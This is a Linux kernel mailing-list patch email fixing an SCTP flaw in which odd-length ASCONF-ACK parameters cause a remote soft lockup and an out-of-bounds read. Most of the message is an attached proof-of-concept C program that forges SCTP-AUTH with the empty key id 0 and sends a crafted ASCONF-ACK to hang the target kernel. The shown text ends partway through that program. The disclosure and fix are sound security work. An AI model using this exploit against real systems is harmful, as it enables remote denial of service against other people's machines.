Received: from mail-oa2-f0.google.com (mail-oa2-f0.google.com [74.125.231.64])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2A11F3E0754
	for <linux-sctp@vger.kernel.org>; Tue, 25 Aug 2026 08:29:28 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.231.64
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787646570; cv=none; b=FsVp4vQVkWkkJ3dgx6lYMJDsvQn/GPbDoDwzJ+5/Yyd7iPG/6JHy2PU0ahb8nMfgitoKor3MgPBbACM/r6iYgMMXOYa7IgZJQ+zdLfmx5ZKckeajcK8wz1Kw0CrbwuPGcokVnGT7XJn09gHkEgYt3kEvK90asfJGzJ/aVTT5S6Y=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787646570; c=relaxed/simple;
	bh=w1tbRZansWzxa28ES9+wft2k/sOampqEvDpGxDo0fgs=;
	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
	 MIME-Version:Content-Type; b=frs3RsfH69PigxICrrxvpZhrLWPPsME7wKDZaY1B2+hkQyaxJz3kWA8/yqBW2R35OpZ1NMUUsDUnNo9f/xJQikpvaAO8CERK/Q82rhhIT7NFWB76c9K8Y20h0O5B/UNTBU50x1EkhBrhdhHJM9KBhWHsIPJbePHTLcJTDAJV18U=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=Al1PD7qg; arc=none smtp.client-ip=74.125.231.64
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="Al1PD7qg"
Received: by mail-oa2-f0.google.com with SMTP id 586e51a60fabf-4483c9986ceso279380fac.0
        for <linux-sctp@vger.kernel.org>; Tue, 25 Aug 2026 01:29:28 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1787646567; x=1788251367; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:mime-version:references
         :in-reply-to:message-id:date:subject:cc:to:from:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=FOnyux7Eq4nejYMDULo1CLVDsIGOaYtyoZkylSPwTm8=;
        b=Al1PD7qgcHq9Cx0ntTMbMR+uMuvxP7x42xPmABvjU4CDmvxjDoOD78/Sbr0le+Sz/E
         Ieya3wHd0rgNjddtzhez69Yc3purwrX97XHUh2jZHDFDWIgO8lhfOpbnACbiWSfzM8Xg
         Y6gIge5omt+dVUv1gIJouPyLgY1B4+AFltympCDuYG27opFvaNV+7X23B0SLm1XjHyll
         yRFoZ6tYKdVc9VWyhP99C479JxskNNOJJchIsmcrKPB46iuPHvKSt+Oy7OJnF2l4uts+
         AAVj2lvyZ69kDv/2EFU7K4Aa+te/x1gzPgRVuolm4T6B1Hw1fBwAdTOkTCIOT0/YyIag
         ah+w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787646567; x=1788251367;
        h=content-transfer-encoding:content-type:mime-version:references
         :in-reply-to:message-id:date:subject:cc:to:from:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=FOnyux7Eq4nejYMDULo1CLVDsIGOaYtyoZkylSPwTm8=;
        b=p03+Bww5lwHklEBhp3lOQtHoePJbNjhfeAyBX04JIqa/OwAlA22IM9KrsW+/5YlnRu
         SPR8XPRzlk5MyGvvYbsXFCDoWoH7lVh3rt25G+JlKfbKkrFzjfwtBKugQP/uy+2Sw1YM
         D7sO4B1vBy+U2Wa5FNKX36KuLPVCr51uHpapBrDVeOCXJ5lEkv8u4r2287XtUHBBJMNL
         8u9t1/dJVVCc46YNLvJjn963tf2M+bvuJ/oe8OwITEU7SXEf9Hn2bcILqFzTGk0Qpwau
         eq2GezJ+iQ0GDfmJ2mhNx3rvTnRS9gGjh4K6ZaxdQXStII48pGk0xo+6OR9rBGmpPQja
         lMRQ==
X-Forwarded-Encrypted: i=1; AHgh+Rrqp6iBuj9LN/N0lKTXueJDcBDsDOP56MUAkGD0XttzYaswTiUJl2rIUpI5JU3XdQuc6yVr3JKj4UWB@vger.kernel.org
X-Gm-Message-State: AFuF++ncFVLnWBlDwclFlqKR8JJ2vT/4mgs/sXkWBf2QjvuthgvohnkH
	HtO7mz/1djDbeKN+FaqnDixTU5tpp+E3/KMsJH/0n4ZydYLih5IO4LjOeNrWodgBGyHCWg==
X-Gm-Gg: AR+sD11V6T1i8YDwv6e1fLRl9HzPAN+/g/HSA4qQhkF68EGuP0SJa7/OczjLNkZ53/x
	uX+HepKaNNyJjGjjCd8FnejMXhRevDKIR3l3R2XnC2oZEj0JZyY6HkDOjQAQj5eFoXxSGIvRxvR
	i2VfzCRIiHBS7C85Vr03/BapXmwDAxhFGwJ7DI/WFH5SMBGfSIdHCYg7CfA3FJLytdJmRu4xfHT
	Ij4yerPFhSq5o15/gA7JvHhQ2vb5oeNn93eVhT/zKj+mfrIKL+Fo/0kAD7z20HSn4FEPqNBncQV
	8GfQaPLkhBVkU9mzYaNtiNpXao8gklLlJbE91tOn75Bj5PxtvQ+hGIRWKv+Hugfbn9Y7ESBIvgD
	hry9wAkPRLqbO4uNi5Flmw5ntx3rQDQy5vO6gNYnt1edqQWhAsf4rzGYkkLhDv6fc4y0XIM3CRP
	MDj6jjAqCEYMTHCqfqMyIPB7B1v9QIrDZdmOFhRz+y8LWTwGQZu3VSnWJdcBZM6DXLiH/aOBWxH
	HbDsoAoX5LflaPTSxXglkUT7A==
X-Received: by 2002:a05:6871:4915:b0:44d:2da0:fa1f with SMTP id 586e51a60fabf-46449933014mr3911517fac.10.1787646566845;
        Tue, 25 Aug 2026 01:29:26 -0700 (PDT)
Received: from localhost.localdomain ([14.22.11.162])
        by smtp.gmail.com with ESMTPSA id 586e51a60fabf-46382b47bd5sm6869486fac.0.2026.08.25.01.29.14
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 25 Aug 2026 01:29:26 -0700 (PDT)
From: Henry Martin <bsdhenrymartin@gmail.com>
To: Xin Long <lucien.xin@gmail.com>
Cc: netdev@vger.kernel.org,
	linux-sctp@vger.kernel.org,
	Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>,
	"David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	Henry Martin <bsdhenrymartin@gmail.com>
Subject: [PATCH net v2] sctp: fix soft lockup from unpadded ASCONF-ACK parameter iteration
Date: Tue, 25 Aug 2026 16:29:09 +0800
Message-ID: <20260825082909.2650171-1-bsdhenrymartin@gmail.com>
X-Mailer: git-send-email 2.43.7
In-Reply-To: <CADvbK_dr8Oz7DFpA3YJ_YH0HXgWJgkQPRK7QNDCUQrQzQnw-MQ@mail.gmail.com>
References: <CADvbK_dr8Oz7DFpA3YJ_YH0HXgWJgkQPRK7QNDCUQrQzQnw-MQ@mail.gmail.com>
Precedence: bulk
X-Mailing-List: linux-sctp@vger.kernel.org
List-Id: <linux-sctp.vger.kernel.org>
List-Subscribe: <mailto:linux-sctp+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-sctp+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

sctp_verify_asconf() walks ASCONF-ACK parameters with
sctp_walk_params(), which advances by SCTP_PAD4(length), and its
SCTP_PARAM_ERR_CAUSE case performs no length checks, so an odd-length
parameter passes verification. The consumer sctp_get_asconf_response()
then iterates the same parameters advancing by the raw length, without
padding. A single odd-length parameter desynchronises the two walks and
makes the consumer interpret attacker-controlled bytes at a misaligned
offset.

When those bytes yield a length of zero, the while loop over
asconf_ack_len makes no progress, spinning forever in softirq context,
and the watchdog reports a soft lockup. A remote peer can trigger this
with a crafted ASCONF-ACK on an ADD-IP enabled association with an
outstanding ASCONF (RFC 5061 section 4.1.2 requires the chunk to be
authenticated, but the predefined empty key id 0 allows the peer to
compute the same association HMAC from publicly exchanged parameters,
so the gate does not help).

The missing length check in the SCTP_PARAM_ERR_CAUSE case also lets a
4-byte parameter reach the consumer, which reads crr_id (offset 4)
before validating anything, yielding a 4-byte out-of-bounds read past
the parameter, as reported by Sashiko.

All reads stay within the received skb for the lockup, so it is a
pure remote denial of service.

Reject undersized SCTP_PARAM_ERR_CAUSE parameters at the verifier,
and advance the consumer iterator with the same padding rule as the
verifier to keep the two walks in lockstep. The verifier change alone
guarantees length >= sizeof(struct sctp_paramhdr) for every parameter
the consumer can see, so no separate minimum-length check is needed in
the consumer. The consumer padding fix is still required because odd
lengths >= sizeof(struct sctp_addip_param) remain valid for
SCTP_PARAM_ERR_CAUSE per RFC 5061.

The issue was found by ZeroHive, a vulnerability hunting agent at
Tencent Yunding Lab.

Fixes: 1da177e4c3f4 ("Linux-2.6.12-rc2")
Signed-off-by: Henry Martin <bsdhenrymartin@gmail.com>
---
v2:
- Drop the redundant length < sizeof(struct sctp_paramhdr) check in
  sctp_get_asconf_response(); sctp_walk_params() together with the
  param.v != chunk->chunk_end check in sctp_verify_asconf() already
  guarantees it (Xin Long).
- Add length < sizeof(struct sctp_addip_param) check to the
  SCTP_PARAM_ERR_CAUSE case in sctp_verify_asconf(), which also fixes
  the out-of-bounds crr_id read reported by Sashiko.

poc_auth.c:
// SCTP ASCONF-ACK soft-lockup PoC — AUTH-forgery variant (key_id=0 null key)
//
// Goal: prove that even with the HARD default addip_noauth_enable=0, the
// "ASCONF-ACK must be authenticated" gate (sm_statefuns.c:4086) does NOT save
// the victim, because SCTP-AUTH key_id=0 is the predefined empty key and the
// resulting association shared key is derived ONLY from publicly exchanged
// values (both peers' RANDOM/CHUNKS/HMAC_ALGO params, RFC 4895 §6.1).
// An on-path peer computes the same HMAC offline and forges a valid AUTH
// chunk; per inqueue.c, chunk->auth (set by the AUTH chunk in this packet)
// persists for subsequent chunks, so the malicious ASCONF-ACK passes.
//
// Prerequisites (victim):
//   sysctl -w net.sctp.addip_enable=1
//   sysctl -w net.sctp.addip_noauth_enable=0   # default
//   sysctl -w net.sctp.auth_enable=1
//   (kernel with CONFIG_SOFTLOCKUP_DETECTOR=y to see the report)
//
// Guest run: gcc -O2 -o poc_auth poc_auth.c && ./poc_auth   (root, loopback)

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <signal.h>

struct iphdr_local {
	unsigned char ihl_ver, tos;
	unsigned short tot_len, id, frag;
	unsigned char ttl, protocol;
	unsigned short check;
	unsigned int saddr, daddr;
};
#define iphdr iphdr_local
struct sctphdr_local { unsigned short src, dest; unsigned int vtag, check; };
#define sctphdr sctphdr_local

#undef IPPROTO_SCTP
#define IPPROTO_SCTP 132

#define SCTP_PORT_SERVER htons(7777)
#define SCTP_PORT_CLIENT htons(7778)

#define SCTP_CHUNK_INIT 1
#define SCTP_CHUNK_INIT_ACK 2
#define SCTP_CHUNK_COOKIE_ECHO 10
#define SCTP_CHUNK_COOKIE_ACK 11
#define SCTP_CHUNK_AUTH 0x0F
#define SCTP_CHUNK_ASCONF 0xC1
#define SCTP_CHUNK_ASCONF_ACK 0x80

#define SCTP_PARAM_STATE_COOKIE 0x0007
#define SCTP_PARAM_SUPPORTED_EXT 0x8008
#define SCTP_PARAM_RANDOM 0x8002
#define SCTP_PARAM_CHUNKS 0x8003
#define SCTP_PARAM_HMAC_ALGO 0x8004
#define SCTP_HMAC_ID_SHA1 1

#define SCTP_SOCKOPT_BINDX_ADD 100

static int raw_fd;

/* ================= CRC32c (LE on wire, Linux quirk) ================= */
static unsigned int crc32c(const unsigned char *p, size_t n)
{
	static unsigned crc_table[256];
	static int inited = 0;
	if (!inited) {
		for (unsigned i = 0; i < 256; i++) {
			unsigned c = i;
			for (int k = 0; k < 8; k++)
				c = (c & 1) ? (0x82F63B78u ^ (c >> 1)) : (c >> 1);
			crc_table[i] = c;
		}
		inited = 1;
	}
	unsigned c = 0xFFFFFFFFu;
	for (size_t i = 0; i < n; i++)
		c = crc_table[(c ^ p[i]) & 0xFF] ^ (c >> 8);
	return ~c;
}

/* ================= minimal SHA1 + HMAC-SHA1 ================= */
typedef struct { uint32_t h[5]; uint64_t len; uint8_t buf[64]; size_t buflen; } sha1_ctx;

static void sha1_block(sha1_ctx *c, const uint8_t *p)
{
	uint32_t w[80], a, b, cc, d, e;
	for (int i = 0; i < 16; i++)
		w[i] = (p[i*4]<<24) | (p[i*4+1]<<16) | (p[i*4+2]<<8) | p[i*4+3];
	for (int i = 16; i < 80; i++) {
		uint32_t t = w[i-3] ^ w[i-8] ^ w[i-14] ^ w[i-16];
		w[i] = (t << 1) | (t >> 31);
	}
	a = c->h[0]; b = c->h[1]; cc = c->h[2]; d = c->h[3]; e = c->h[4];
	for (int i = 0; i < 80; i++) {
		uint32_t f, k;
		if (i < 20)      { f = (b & cc) | (~b & d);        k = 0x5A827999; }
		else if (i < 40) { f = b ^ cc ^ d;                 k = 0x6ED9EBA1; }
		else if (i < 60) { f = (b & cc) | (b & d) | (cc & d); k = 0x8F1BBCDC; }
		else             { f = b ^ cc ^ d;                 k = 0xCA62C1D6; }
		uint32_t tmp = ((a << 5) | (a >> 27)) + f + e + k + w[i];
		e = d; d = cc; cc = (b << 30) | (b >> 2); b = a; a = tmp;
	}
	c->h[0] += a; c->h[1] += b; c->h[2] += cc; c->h[3] += d; c->h[4] += e;
}

static void sha1_init(sha1_ctx *c)
{
	c->h[0]=0x67452301; c->h[1]=0xEFCDAB89; c->h[2]=0x98BADCFE;
	c->h[3]=0x10325476; c->h[4]=0xC3D2E1F0; c->len=0; c->buflen=0;
}

static void sha1_update(sha1_ctx *c, const uint8_t *p, size_t n)
{
	c->len += n;
	while (n) {
		size_t take = 64 - c->buflen;
		if (take > n) take = n;
		memcpy(c->buf + c->buflen, p, take);
		c->buflen += take; p += take; n -= take;
		if (c->buflen == 64) { sha1_block(c, c->buf); c->buflen = 0; }
	}
}

static void sha1_final(sha1_ctx *c, uint8_t out[20])
{
	uint64_t bits = c->len * 8;
	uint8_t pad = 0x80;
	sha1_update(c, &pad, 1);
	uint8_t z = 0;
	while (c->buflen != 56) sha1_update(c, &z, 1);
	uint8_t lb[8];
	for (int i = 0; i < 8; i++) lb[i] = (bits >> (56 - 8*i)) & 0xFF;
	sha1_update(c, lb, 8);
	for (int i = 0; i < 5; i++) {
		out[i*4]   = (c->h[i] >> 24) & 0xFF;
		out[i*4+1] = (c->h[i] >> 16) & 0xFF;
		out[i*4+2] = (c->h[i] >> 8) & 0xFF;
		out[i*4+3] = c->h[i] & 0xFF;
	}
}

static void hmac_sha1(const uint8_t *key, size_t klen,
		      const uint8_t *msg, size_t mlen, uint8_t out[20])
{
	uint8_t k[64];
	memset(k, 0, 64);
	if (klen > 64) {
		sha1_ctx t; sha1_init(&t); sha1_update(&t, key, klen);
		sha1_final(&t, k);   /* hashed key is exactly 20 bytes */
	} else {
		memcpy(k, key, klen);
	}
	uint8_t ipad[64], opad[64];
	for (int i = 0; i < 64; i++) { ipad[i] = k[i] ^ 0x36; opad[i] = k[i] ^ 0x5c; }
	uint8_t inner[20];
	sha1_ctx c; sha1_init(&c);
	sha1_update(&c, ipad, 64); sha1_update(&c, msg, mlen);
	sha1_final(&c, inner);
	sha1_init(&c);
	sha1_update(&c, opad, 64); sha1_update(&c, inner, 20);
	sha1_final(&c, out);
}

/* ================= SCTP io ================= */
static int send_sctp(unsigned int src_ip, unsigned int dst_ip,
		     unsigned short src_port, unsigned short dst_port,
		     unsigned int vtag,
		     const unsigned char *chunks, size_t chunks_len)
{
	unsigned char pkt[2048];
	struct sctphdr *sh = (struct sctphdr *)pkt;
	sh->src = src_port;
	sh->dest = dst_port;
	sh->vtag = htonl(vtag);
	sh->check = 0;
	memcpy(pkt + sizeof(*sh), chunks, chunks_len);
	sh->check = crc32c(pkt, sizeof(*sh) + chunks_len);
	struct sockaddr_in d = { .sin_family = AF_INET, .sin_port = dst_port, .sin_addr.s_addr = dst_ip };
	if (sendto(raw_fd, pkt, sizeof(*sh) + chunks_len, 0,
		   (struct sockaddr *)&d, sizeof(d)) < 0) {
		perror("sendto");
		return -1;
	}
	return 0;
}

static int recv_packet(unsigned char *buf, size_t buflen, double timeout_sec)
{
	fd_set fds;
	FD_ZERO(&fds);
	FD_SET(raw_fd, &fds);
	struct timeval tv = { (long)timeout_sec, (long)((timeout_sec - (long)timeout_sec) * 1e6) };
	if (select(raw_fd + 1, &fds, NULL, NULL, &tv) <= 0) return -1;
	return (int)recv(raw_fd, buf, buflen, 0);
}

static int find_chunk(const unsigned char *pkt, ssize_t n, unsigned char want,
		      unsigned char *out, size_t outsz, size_t *outlen)
{
	const unsigned char *sctp = pkt + sizeof(struct iphdr_local);
	const unsigned char *ch = sctp + sizeof(struct sctphdr_local);
	ssize_t rem = n - sizeof(struct iphdr_local) - sizeof(struct sctphdr_local);
	while (rem >= 4) {
		unsigned short clen = ntohs(*(const unsigned short *)(ch + 2));
		if (clen < 4 || clen > rem) return -1;
		if (ch[0] == want) {
			size_t c = clen < outsz ? clen : outsz;
			memcpy(out, ch, c);
			if (outlen) *outlen = clen;
			return 0;
		}
		ch += (clen + 3) & ~3u;
		rem -= (clen + 3) & ~3u;
	}
	return -1;
}

/* ---- captured AUTH params (raw param bytes incl. 4-byte hdr, no padding) ---- */
struct auth_param_set {
	unsigned char random[64]; size_t random_len;
	unsigned char chunks[64]; size_t chunks_len;   /* may be 0 if absent */
	unsigned char hmacs[64];  size_t hmacs_len;
};

static void extract_param(const unsigned char *chunk, size_t clen, int is_initack,
			  struct auth_param_set *ap)
{
	size_t off = is_initack ? 20 : 0; /* skip chunk hdr + init fixed hdr */
	if (!is_initack) return;
	while (off + 4 <= clen) {
		unsigned short pt = ntohs(*(const unsigned short *)(chunk + off));
		unsigned short pl = ntohs(*(const unsigned short *)(chunk + off + 2));
		if (pl < 4 || off + pl > clen) break;
		if (pt == 0x8002 && pl <= sizeof(ap->random)) {
			memcpy(ap->random, chunk + off, pl); ap->random_len = pl;
		} else if (pt == 0x8003 && pl <= sizeof(ap->chunks)) {
			memcpy(ap->chunks, chunk + off, pl); ap->chunks_len = pl;
		} else if (pt == 0x8004 && pl <= sizeof(ap->hmacs)) {
			memcpy(ap->hmacs, chunk + off, pl); ap->hmacs_len = pl;
		}
		off += (pl + 3) & ~3u;
	}
}

/* our fixed INIT params (must mirror build_init exactly, no padding) */
static struct auth_param_set peer_ap;

static size_t build_init(unsigned char *out, unsigned int init_tag, unsigned int tsn)
{
	size_t o = 0;
	out[o++] = SCTP_CHUNK_INIT; out[o++] = 0;
	unsigned short lp = o; o += 2;
	*(unsigned int *)(out + o) = htonl(init_tag); o += 4;
	*(unsigned int *)(out + o) = htonl(65535); o += 4;
	*(unsigned short *)(out + o) = htons(10); o += 2;
	*(unsigned short *)(out + o) = htons(10); o += 2;
	*(unsigned int *)(out + o) = htonl(tsn); o += 4;

	/* RANDOM hdr4+32 */
	size_t ps = o;
	*(unsigned short *)(out + o) = htons(SCTP_PARAM_RANDOM); o += 2;
	*(unsigned short *)(out + o) = htons(4 + 32); o += 2;
	for (int i = 0; i < 32; i++) out[o++] = (unsigned char)(i | 1);
	peer_ap.random_len = 36;
	memcpy(peer_ap.random, out + ps, peer_ap.random_len);

	/* CHUNKS len 5 (one id: DATA), pad to 8 */
	ps = o;
	*(unsigned short *)(out + o) = htons(SCTP_PARAM_CHUNKS); o += 2;
	*(unsigned short *)(out + o) = htons(4 + 1); o += 2;
	out[o++] = 0x00;
	out[o++] = 0; out[o++] = 0; out[o++] = 0;
	peer_ap.chunks_len = 5;
	memcpy(peer_ap.chunks, out + ps, peer_ap.chunks_len);

	/* HMAC_ALGO len 6 (SHA1), pad to 8 */
	ps = o;
	*(unsigned short *)(out + o) = htons(SCTP_PARAM_HMAC_ALGO); o += 2;
	*(unsigned short *)(out + o) = htons(4 + 2); o += 2;
	*(unsigned short *)(out + o) = htons(SCTP_HMAC_ID_SHA1); o += 2;
	out[o++] = 0; out[o++] = 0;
	peer_ap.hmacs_len = 6;
	memcpy(peer_ap.hmacs, out + ps, peer_ap.hmacs_len);

	/* SUPPORTED_EXT: AUTH + ASCONF + ASCONF_ACK, len 7, pad to 8 */
	*(unsigned short *)(out + o) = htons(SCTP_PARAM_SUPPORTED_EXT); o += 2;
	*(unsigned short *)(out + o) = htons(4 + 3); o += 2;
	out[o++] = SCTP_CHUNK_AUTH;
	out[o++] = SCTP_CHUNK_ASCONF;
	out[o++] = SCTP_CHUNK_ASCONF_ACK;
	out[o++] = 0;

	*(unsigned short *)(out + lp) = htons((unsigned short)o);
	return o;
}

/* vector = random || chunks || hmacs (declared lengths only, padding stripped) */
static size_t make_vector(const struct auth_param_set *ap, unsigned char *out)
{
	size_t n = 0;
	memcpy(out + n, ap->random, ap->random_len); n += ap->random_len;
	if (ap->chunks_len) { memcpy(out + n, ap->chunks, ap->chunks_len); n += ap->chunks_len; }
	memcpy(out + n, ap->hmacs, ap->hmacs_len); n += ap->hmacs_len;
	return n;
}

/* kernel's numeric vector compare (auth.c:149) */
static int cmp_vectors(const unsigned char *v1, size_t l1,
		       const unsigned char *v2, size_t l2)
{
	long diff = (long)l1 - (long)l2;
	if (diff) {
		const unsigned char *longer = diff > 0 ? v1 : v2;
		long ad = diff > 0 ? diff : -diff;
		for (long i = 0; i < ad; i++)
			if (longer[i] != 0) return diff > 0 ? 1 : -1;
	}
	size_t m = l1 < l2 ? l1 : l2;
	return memcmp(v1, v2, m);
}

int main(void)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	unsigned int srv = inet_addr("127.0.0.1");

	int sync_pipe[2];
	if (pipe(sync_pipe) < 0) { perror("pipe"); return 1; }
	pid_t vic = fork();
	if (vic == 0) {
		close(sync_pipe[1]);
		int s = socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP);
		if (s < 0) _exit(1);
		struct sockaddr_in a = { .sin_family = AF_INET, .sin_port = SCTP_PORT_SERVER,
					 .sin_addr.s_addr = inet_addr("127.0.0.1") };
		if (bind(s, (struct sockaddr *)&a, sizeof(a)) < 0) _exit(2);
		if (listen(s, 5) < 0) _exit(3);
		char tok;
		if (read(sync_pipe[0], &tok, 1) != 1) _exit(4);
		struct sockaddr_in sin;
		memset(&sin, 0, sizeof(sin));
		sin.sin_family = AF_INET;
		sin.sin_port = SCTP_PORT_SERVER;
		sin.sin_addr.s_addr = inet_addr("127.0.0.2");
		for (int t = 0; t < 5; t++) {
			int r = setsockopt(s, IPPROTO_SCTP, SCTP_SOCKOPT_BINDX_ADD,
					   &sin, sizeof(sin));
			printf("[victim] bindx ADD 127.0.0.2 (try %d) -> %d (%s)\n",
			       t, r, r ? strerror(errno) : "ok");
			if (r == 0) break;
			sleep(1);
		}
		pause();
		_exit(0);
	}
	close(sync_pipe[0]);

	raw_fd = socket(AF_INET, SOCK_RAW, IPPROTO_SCTP);
	if (raw_fd < 0) { perror("raw socket"); kill(vic, SIGKILL); return 1; }
	struct sockaddr_in rb = { .sin_family = AF_INET, .sin_addr.s_addr = srv };
	bind(raw_fd, (struct sockaddr *)&rb, sizeof(rb));
	sleep(1);

	/* ---- handshake with AUTH capability declared ---- */
	unsigned char buf[2048], initbuf[256];
	size_t initlen = build_init(initbuf, 0x11223344, 0x1000);
	printf("[*] INIT (%zu bytes)\n", initlen);
	send_sctp(srv, srv, SCTP_PORT_CLIENT, SCTP_PORT_SERVER, 0, initbuf, initlen);

	unsigned int server_tag = 0, my_vtag = 0;
	unsigned char cookie[512]; size_t cookie_len = 0;
	struct auth_param_set local_ap;
	memset(&local_ap, 0, sizeof(local_ap));
	for (int i = 0; i < 10 && !cookie_len; i++) {
		ssize_t n = recv_packet(buf, sizeof(buf), 1.0);
		if (n <= 0) { send_sctp(srv, srv, SCTP_PORT_CLIENT, SCTP_PORT_SERVER, 0, initbuf, initlen); continue; }
		const unsigned char *sctp = buf + sizeof(struct iphdr_local);
		const unsigned char *ch = sctp + sizeof(struct sctphdr_local);
		ssize_t rem = n - sizeof(struct iphdr_local) - sizeof(struct sctphdr_local);
		while (rem >= 4) {
			unsigned short clen = ntohs(*(const unsigned short *)(ch + 2));
			if (clen < 4 || clen > rem) break;
			if (ch[0] == SCTP_CHUNK_INIT_ACK) {
				server_tag = ntohl(*(const unsigned int *)(ch + 4));
				extract_param(ch, clen, 1, &local_ap);
				const unsigned char *p = ch + 20;
				size_t plen = clen - 20;
				while (plen >= 4) {
					unsigned short pt = ntohs(*(const unsigned short *)p);
					unsigned short pl = ntohs(*(const unsigned short *)(p + 2));
					if (pl < 4 || pl > plen) break;
					if (pt == SCTP_PARAM_STATE_COOKIE) {
						cookie_len = pl - 4;
						if (cookie_len > sizeof(cookie)) cookie_len = sizeof(cookie);
						memcpy(cookie, p + 4, cookie_len);
					}
					p += (pl + 3) & ~3u;
					plen -= (pl + 3) & ~3u;
				}
			}
			ch += (clen + 3) & ~3u;
			rem -= (clen + 3) & ~3u;
		}
	}
	if (!cookie_len) { printf("[-] no INIT-ACK/cookie\n"); kill(vic, SIGKILL); return 1; }
	my_vtag = *(const unsigned int *)(cookie + 36);
	printf("[+] INIT-ACK: server_tag=0x%08x cookie_len=%zu my_vtag=0x%08x\n",
	       server_tag, cookie_len, my_vtag);
	printf("[+] victim AUTH params: random=%zuB chunks=%zuB hmacs=%zuB\n",
	       local_ap.random_len, local_ap.chunks_len, local_ap.hmacs_len);

	/* sanity: victim must advertise SHA1 or we can't forge SHA1 HMAC */
	{
		int sha1_ok = 0;
		for (size_t i = 4; i + 2 <= local_ap.hmacs_len; i += 2)
			if (ntohs(*(unsigned short *)(local_ap.hmacs + i)) == SCTP_HMAC_ID_SHA1) sha1_ok = 1;
		printf("[%c] victim accepts SHA1 HMAC\n", sha1_ok ? '+' : '-');
		if (!sha1_ok) { kill(vic, SIGKILL); return 1; }
	}

	/* COOKIE-ECHO (real cookie) */
	unsigned char ce[600];
	size_t o = 0;
	ce[o++] = SCTP_CHUNK_COOKIE_ECHO; ce[o++] = 0;
	unsigned short lpc = o; o += 2;
	memcpy(ce + o, cookie, cookie_len); o += cookie_len;
	*(unsigned short *)(ce + lpc) = htons((unsigned short)o);
	while (o % 4) ce[o++] = 0;
	send_sctp(srv, srv, SCTP_PORT_CLIENT, SCTP_PORT_SERVER, my_vtag, ce, o);
	printf("[*] COOKIE-ECHO sent (%zu bytes)\n", o);

	int established = 0;
	for (int i = 0; i < 10 && !established; i++) {
		ssize_t n = recv_packet(buf, sizeof(buf), 1.0);
		if (n <= 0) { send_sctp(srv, srv, SCTP_PORT_CLIENT, SCTP_PORT_SERVER, my_vtag, ce, o); continue; }
		size_t l;
		if (find_chunk(buf, n, SCTP_CHUNK_COOKIE_ACK, buf, 0, &l) == 0) established = 1;
	}
	printf("[%c] association %s\n", established ? '+' : '-',
	       established ? "ESTABLISHED" : "failed");
	if (!established) { kill(vic, SIGKILL); return 1; }

	if (write(sync_pipe[1], "x", 1) != 1) perror("pipe write");
	close(sync_pipe[1]);

	/* ---- sniff victim ASCONF ---- */
	unsigned int asconf_serial = 0;
	unsigned char ack_chunk[16]; size_t alen = 0;
	printf("[*] waiting for victim ASCONF ...\n");
	for (int i = 0; i < 15 && !asconf_serial; i++) {
		ssize_t n = recv_packet(buf, sizeof(buf), 1.0);
		if (n <= 0) continue;
		size_t l = 0;
		if (find_chunk(buf, n, SCTP_CHUNK_ASCONF, ack_chunk, sizeof(ack_chunk), &alen) == 0) {
			if (alen >= 8)
				asconf_serial = ntohl(*(const unsigned int *)(ack_chunk + 4));
		}
	}
	if (!asconf_serial) { printf("[-] no ASCONF seen\n"); kill(vic, SIGKILL); return 1; }
	printf("[+] ASCONF serial=0x%08x\n", asconf_serial);

	/* ---- build malicious ASCONF-ACK (same as poc.c) ---- */
	unsigned char ack[400];
	size_t a = 0;
	ack[a++] = SCTP_CHUNK_ASCONF_ACK; ack[a++] = 0;
	unsigned short lpa = a; a += 2;
	*(unsigned int *)(ack + a) = htonl(asconf_serial); a += 4;
	size_t pa = a;
	*(unsigned short *)(ack + a) = htons(0xc003); a += 2;   /* ERR_CAUSE len 5 */
	*(unsigned short *)(ack + a) = htons(5); a += 2;
	ack[a++] = 0x41;
	ack[a++] = 0; ack[a++] = 0; ack[a++] = 0;
	*(unsigned short *)(ack + a) = htons(0xc003); a += 2;   /* ERR_CAUSE len 252 */
	*(unsigned short *)(ack + a) = htons(252); a += 2;
	memset(ack + a, 0x42, 252 - 4); a += 252 - 4;
	*(unsigned short *)(ack + pa + 199) = 0x0000;
	*(unsigned int  *)(ack + pa + 201) = htonl(0xffffffff);
	*(unsigned short *)(ack + lpa) = htons((unsigned short)a);
	while (a % 4) ack[a++] = 0;

	/* ---- compute key_id=0 shared secret from PUBLIC vectors ---- */
	unsigned char lv[160], pv[160], secret[320];
